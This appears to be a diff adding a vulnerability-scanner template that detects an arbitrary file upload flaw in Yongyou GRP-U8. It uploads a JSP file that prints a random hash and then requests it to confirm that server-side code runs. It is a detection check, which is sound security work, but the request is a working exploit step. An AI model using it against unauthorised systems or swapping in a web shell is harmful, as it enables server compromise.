@@ -1,0 +1,48 @@
+id: yongyou-grp-u8-fileupload-anyfile-upload
+
+info:
+  name: Yongyou GRP-U8 FileUpload Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: fileupload
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/servlet/FileUpload?fileName={{t1}}.jsp&actionID=update"
+    headers:
+      Content-Type: text/plain; charset=utf-8
+    body: "<%out.println(\"{{t2}}\");%>"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<"
+        negative: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/R9iPortal/upload/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+      - type: word
+        words:
+          - "<"
+        negative: true
